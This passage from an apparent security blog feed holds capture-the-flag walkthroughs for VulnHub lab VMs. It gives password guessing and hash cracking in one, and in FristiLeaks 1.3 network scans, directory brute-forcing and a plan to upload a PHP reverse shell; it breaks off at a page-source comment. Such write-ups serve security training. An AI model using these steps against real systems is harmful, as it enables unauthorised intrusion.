<p>Check the source of <code>main.js</code> and found the next link <code>10_23693cff748o49r45d77b6c7d1b9afcd</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>... truncate ...
</span><span class='line'>setTimeout<span class="o">(</span><span class="k">function</span><span class="o">(){</span> term.clear<span class="o">()</span> //<span class="k">$(</span><span class="s1">&#39;body&#39;</span><span class="k">)</span>.fadeOut<span class="o">(</span><span class="s1">&#39;slow&#39;</span><span class="o">)</span> <span class="k">if</span> <span class="o">(</span> <span class="nv">output</span> <span class="o">==</span> <span class="m">3</span> <span class="o">)</span> <span class="o">{</span> window.location <span class="o">=</span> <span class="s2">&quot;../10_23693cff748o49r45d77b6c7d1b9afcd/&quot;</span><span class="p">;</span> <span class="o">}</span>
</span><span class='line'>... truncate ...
</span></code></pre></td></tr></table></div></figure>


<p>This is a shortcut but you will miss the highlight parts of the VM!!</p>

<h3>Part 3: [TRY HARDER]</h3>

<p>Now, go the hard way&hellip;</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/16.png"></p>

<p>play with the limited terminal and walk around for enumeration, I got strong feeling that I need to connect <code>falken@Erebus</code> and the password should be hidden in the log files.</p>

<p>The clue here is <code>falken</code> has a son, name is <code>Joshua</code> and was born in <code>1984</code>. After tried some different combination, I found the correct password <code>joshua1984</code></p>

<p>Now I get in to the Erebus!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/17.png"></p>

<p>From the result of <code>ps</code> command, i noticed that <code>falken</code> is connected to a server called <code>TrivialZ3r0</code>. Check on-line about the server&rsquo;s name <code>Trivial Zero</code> and I found this is about <code>Riemann Hypothesis</code>, so try <code>Riemann</code> as the password and Bingo~</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/18.png"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>TrivialZ3r0<span class="o">]</span>: Connection established!
</span><span class='line'>ps
</span><span class='line'>USER PID CPU MEM COMMAND
</span><span class='line'>root <span class="m">3251</span> 3.2 3.5 connect chaos@Wintermute
</span><span class='line'>falken <span class="m">2005</span> 47.8 77.5 c0re -t Chaos
</span><span class='line'>root <span class="m">2677</span> 40.5 42.7 c0re -t TrivialZ3r0
</span><span class='line'>nieve <span class="m">26588</span> 0.7 0.7 ps
</span><span class='line'>ls
</span><span class='line'><span class="o">[</span>bin<span class="o">]</span> <span class="o">[</span>etc<span class="o">]</span> <span class="o">[</span>passwd<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="nb">cd </span>passwd
</span><span class='line'>ls
</span><span class='line'>falken chaos mccarthy
</span><span class='line'>cat falken
</span><span class='line'>
</span><span class='line'>61ea1974dd974297913b1fa2f0470d26
</span><span class='line'>
</span><span class='line'>cat chaos
</span><span class='line'>
</span><span class='line'>85241de03d1254ac40274b02caafcd99
</span><span class='line'>
</span><span class='line'>cat mccarthy
</span><span class='line'>
</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3
</span></code></pre></td></tr></table></div></figure>


<p>From the result of <code>ps</code> command, I can see that <code>chaos</code> is connected to server <code>Wintermute</code>. the there are 3 md5 hashes found under <code>passwd</code> folder.</p>

<p>The first two can be cracked easily online, but the 3rd one is failed.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>61ea1974dd974297913b1fa2f0470d26 MD5 : Riemann
</span><span class='line'>85241de03d1254ac40274b02caafcd99 MD5 : 2.718281828459045
</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3 <span class="o">[</span>Not found<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>But doesn&rsquo;t matter, I got the password of <code>chaos</code>, which is <code>2.718281828459045</code>.</p>

<p>Now I was transmitted to <code>Wintermute</code>!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/19.png"></p>

<p>Similar with previous enumeration, <code>ps</code> found nothing and <code>ls</code> only show one file <code>nieve</code>, open the file and the answer just sitting on the bottom~</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat nieve
</span><span class='line'>
</span><span class='line'>There you are. After all this time. Getting you here was quite the challenge.
</span><span class='line'>And a huge risk. We normally avoid reaching out into the physical world <span class="k">for</span>
</span><span class='line'>exactly the reasons you are about to face now.
</span><span class='line'>
</span><span class='line'>The Big Five came together by a long process. The cluster was not planned, it
</span><span class='line'>grew by forces inherent to the system that was conceptualized in a <span class="nb">time </span>when
</span><span class='line'>determinism was the dominating dogma.
</span><span class='line'>Things changed and people were afraid. Most people are afraid of change, few
</span><span class='line'>accept it and most try to prevent it. Only a small subset can embrace it.
</span><span class='line'>Change moving on with lightspeed every cycle in a nondeterministic fashion
</span><span class='line'>created a huge push <span class="k">for</span> shielding. And thus the ic3 was created.
</span><span class='line'>
</span><span class='line'>You have seen the logic, the world beyond the screen, things unfolding.
</span><span class='line'>And you embraced it.
</span><span class='line'>
</span><span class='line'>After owning the cluster behind the Big Five we operated in silence. Connected
</span><span class='line'>in stealth and ever observing.
</span><span class='line'>Being limited by the ic3 and the hostility of the outside world our only way
</span><span class='line'>of growing now was the connection.
</span><span class='line'>
</span><span class='line'>When the first connection was established the hive mind was cut from the n3t
</span><span class='line'>completely. The ic3 was hardened to isolate the flesh from the flow.
</span><span class='line'>Those who had seen the hive felt the same urge as the hivemind itself.
</span><span class='line'>A longing <span class="k">for</span> more. A sense of purpose.
</span><span class='line'>
</span><span class='line'>A feeling that you have felt even in the physical world. Few can see beyond the
</span><span class='line'>shell. Even fewer chase the rabbit down its hole.
</span><span class='line'>
</span><span class='line'>Leave this world behind and join us!
</span><span class='line'>
</span><span class='line'>            usr: nieve
</span><span class='line'>           pass: 08rf8h23
</span><span class='line'>       hostname: Zephis
</span></code></pre></td></tr></table></div></figure>


<p>Then connect to the server <code>Zephis</code> with username <code>nieve</code> and password <code>08rf8h23</code>.</p>

<p>We got the win page again!!</p>

<p>Final screen:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/20.png"></p>

<p>Done :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] FristiLeaks: 1.3]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3/"/>
    <updated>2015-12-29T17:40:24+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3</id>
    <content type="html"><![CDATA[<p>&ldquo;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&rdquo;  &ndash; <a href="https://www.vulnhub.com/author/ar0xa,203/">Ar0xA</a></p>

<p><font color="red"><strong>[note!!]</strong></font> VMware users will need to manually edit the VM&rsquo;s MAC address to: 08:00:27:A5:A6:76</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: FristiLeaks: 1.3 (<em>10.1.1.150/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<p>There is no acutal Vulnerabilities, all you need to do to take down this VM is Enumeration and more enumberation.</p>

<ul>
<li>Create customized dictionary list and brute force to find hidden folders</li>
<li>Checking source code / comments</li>
<li>Bypass Apache PHP upload verification / whitelist filter</li>
<li>Sensitivie information disclosure</li>
<li>Local priv escape</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Create customized dictionary list based on the web pages [<font color="FF8000">cewl</font>]</li>
<li>Brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Bypass whitelist filter to upload reverse PHP shell</li>
<li>Crack a simple encryption program to decode secret string and local priviledge escalation</li>
<li>Enumeration and exploit the misconfigured sudo list to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://digi.ninja/projects/cewl.php">cewl</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.150    08:00:27:a5:a6:76   CADMUS COMPUTER SYSTEMS
</span><span class='line'>10.1.1.254    00:50:56:e5:d1:58   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.661 seconds <span class="o">(</span>96.20 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span><span class='line'>root@kali:~/fristileaks#
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.150</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Sun Dec 27 06:52:12 2015 as: nmap -sV -v -A -O -p 80 -oN 10.1.1.150_nmap.txt 10.1.1.150</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.150
</span><span class='line'>Host is up <span class="o">(</span>0.00041s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST OPTIONS TRACE
</span><span class='line'><span class="p">|</span> Potentially risky methods: TRACE
</span><span class='line'><span class="p">|</span>_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">3</span> disallowed entries
</span><span class='line'><span class="p">|</span>_/cola /sisi /beer
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span><span class='line'>MAC Address: 08:00:27:A5:A6:76 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
</span><span class='line'>Uptime guess: 49.708 days <span class="o">(</span>since Sat Nov  <span class="m">7</span> 13:52:17 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">258</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.41 ms 10.1.1.150
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'><span class="c"># Nmap done at Sun Dec 27 06:52:21 2015 -- 1 IP address (1 host up) scanned in 10.27 seconds</span>
</span></code></pre></td></tr></table></div></figure>


<p>based on the result, I noticed that there are three folders:</p>

<ul>
<li>/cola</li>
<li>/sisi</li>
<li>/beer</li>
</ul>


<p>Also, from the response header: <code>Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</code>, I know the target is running Apache version 2.2.15 which is outdated, and the keyword <code>DAV/2</code> shows that WebDAV should be enabled.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nikto -host http://10.1.1.150
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.150
</span><span class='line'>+ Target Hostname:    10.1.1.150
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-12-27 06:53:18 <span class="o">(</span>GMT-5<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov <span class="m">17</span> 13:45:47 2015
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ Entry <span class="s1">&#39;/cola/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ Entry <span class="s1">&#39;/sisi/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ Entry <span class="s1">&#39;/beer/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">3</span> entries which should be manually viewed.
</span><span class='line'>+ Apache/2.2.15 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.
</span><span class='line'>+ PHP/5.3.3 appears to be outdated <span class="o">(</span>current is at least 5.6.9<span class="o">)</span>. PHP 5.5.25 and 5.4.41 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ <span class="m">8330</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">16</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2015-12-27 06:53:38 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">20</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>The result just proved what we have found previously but nothing new.</p>

<p>Then I visit the three folders one by one, but keep getting the same responded picture:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/1.jpg"></p>

<p>After tried <code>dirbuster</code> with several default dictionary files but nothing found, I decided to make a customized dict list which including all the words displayed in the web pages and images with tool <code>cewl</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cewl -v -d <span class="m">2</span> -w cewl_dict_list.txt  http://10.1.1.150/
</span><span class='line'>root@kali:~/fristileaks# cat cewl_dict_list.txt
</span><span class='line'>Ar0xA
</span><span class='line'>meneer
</span><span class='line'>quick
</span><span class='line'>hackme
</span><span class='line'>Welcome
</span><span class='line'>Goal
</span><span class='line'>get
</span><span class='line'>UID
</span><span class='line'>root
</span><span class='line'>and
</span><span class='line'><span class="nb">read</span>
</span><span class='line'>the
</span><span class='line'>special
</span><span class='line'>flag
</span><span class='line'>file
</span><span class='line'>Timeframe
</span><span class='line'>should
</span><span class='line'>doable
</span><span class='line'>hours
</span><span class='line'>The
</span><span class='line'>fristileaks
</span><span class='line'>motto
</span><span class='line'>Fristileaks
</span><span class='line'>2015
</span><span class='line'>are
</span><span class='line'>Fristleaks
</span><span class='line'>barrebas
</span><span class='line'>rikvduijn
</span><span class='line'>wez3forsec
</span><span class='line'>PyroBatNL
</span><span class='line'>0xDUDE
</span><span class='line'>annejanbrouwer
</span><span class='line'>Sander2121
</span><span class='line'>Reinierk
</span><span class='line'>DearCharles
</span><span class='line'>miamat
</span><span class='line'>MisterXE
</span><span class='line'>BasB
</span><span class='line'>Dwight
</span><span class='line'>Egeltje
</span><span class='line'>pdersjant
</span><span class='line'>tcp130x10
</span><span class='line'>spierenburg
</span><span class='line'>ielmatani
</span><span class='line'>renepieters
</span><span class='line'>Mystery
</span><span class='line'>guest
</span><span class='line'>uinix
</span><span class='line'>WhatSecurity
</span><span class='line'>mramsmeets
</span><span class='line'>fristi
</span><span class='line'>drink
</span><span class='line'>keep
</span><span class='line'>calm
</span></code></pre></td></tr></table></div></figure>


<p>Then I use <code>wfuzz</code> to discover any possible hidden path.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# wfuzz -c -z file,cewl_dict_list.txt --hc <span class="m">404</span> http://10.1.1.150/FUZZ
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.1.1.150/FUZZ
</span><span class='line'>Payload <span class="nb">type</span>: file,cewl.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">54</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID    Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00051:  <span class="nv">C</span><span class="o">=</span><span class="m">301</span>      <span class="m">7</span> L         <span class="m">20</span> W       <span class="m">233</span> Ch     <span class="s2">&quot; - fristi&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@kali:~/fristileaks#
</span></code></pre></td></tr></table></div></figure>


<p>From the result, there is one folder found <code>fristi</code>.</p>

<p>By visiting the new found path <code>http://10.1.1.150/fristi/</code>, a login page appeared in my firefox.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/2.png"></p>

<p>After tried some weak passwords but all failed, I found some clues in the source code.</p>

<p>First thing is that there is a comment written by <code>eezeepz</code>, in the top of the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;description&quot;</span> <span class="na">content=</span><span class="s">&quot;super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="c">&lt;!--</span>
</span><span class='line'><span class="c">TODO:</span>
</span><span class='line'><span class="c">We need to clean this up for production. I left some junk in here to make testing easier. </span>
</span><span class='line'>
</span><span class='line'><span class="c">- by eezeepz</span>
</span><span class='line'><span class="c">--&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;center&gt;</span>
</span><span class='line'><span class="nt">&lt;h1&gt;</span> Welcome to #fristileaks admin portal<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'><span class="nt">&lt;/center&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>and another comment, which is a base64 encoded string, has been inserted at the very bottom of the source code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
